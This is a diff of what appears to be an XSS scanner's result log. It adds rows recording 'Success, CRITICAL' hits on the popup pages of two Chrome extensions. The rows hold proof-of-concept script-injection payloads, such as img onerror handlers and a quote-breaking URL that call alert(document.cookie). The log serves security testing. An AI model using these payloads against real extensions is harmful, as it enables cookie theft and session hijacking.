@@ -1,3 +1,6 @@
 2023-07-05 19:11:01,149, 2023-07-05 19:11:01, Success, CRITICAL, chrome-extension://eipndibocppfpmcfcmjljcdpmcmnooel/popup.html, , http://example.com/';alert(document.cookie);//#
 2023-07-05 19:11:01,687, 2023-07-05 19:11:01, Success, CRITICAL, chrome-extension://eipndibocppfpmcfcmjljcdpmcmnooel/popup.html, , <img src=xss onerror=alert(document.cookie)>
 2023-07-05 19:11:02,015, 2023-07-05 19:11:02, Success, CRITICAL, chrome-extension://eipndibocppfpmcfcmjljcdpmcmnooel/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-07-18 15:46:04,318, 2023-07-18 15:46:04, Success, CRITICAL, chrome-extension://gfgopmgdfobahkcphiiapibkpphpfpog/popup.html, , http://example.com/';alert(document.cookie);//#
+2023-07-18 15:46:04,819, 2023-07-18 15:46:04, Success, CRITICAL, chrome-extension://gfgopmgdfobahkcphiiapibkpphpfpog/popup.html, , <img src=xss onerror=alert(document.cookie)>
+2023-07-18 15:46:04,968, 2023-07-18 15:46:04, Success, CRITICAL, chrome-extension://gfgopmgdfobahkcphiiapibkpphpfpog/popup.html, 1, <img src=xss onerror=alert(1)>
